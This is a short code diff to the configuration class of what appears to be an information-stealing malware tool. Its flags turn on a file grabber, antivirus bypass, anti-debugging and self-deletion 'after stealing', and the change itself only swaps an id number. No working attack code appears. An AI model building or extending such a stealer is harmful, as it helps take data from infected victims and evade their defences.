@@ -1,7 +1,7 @@
 class config:
     enableFileGrabber = False #enable file grabber
     oneStart = False #enable this if you want logs to come only from unique computers
-    id = 13082007170220070000 #unique id for oneStart
+    id = 123456789101112 #unique id for oneStart
     avbypass = True #enable antiviruses bypass
     selfDestruct = False #deletes itself after stealing
     debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
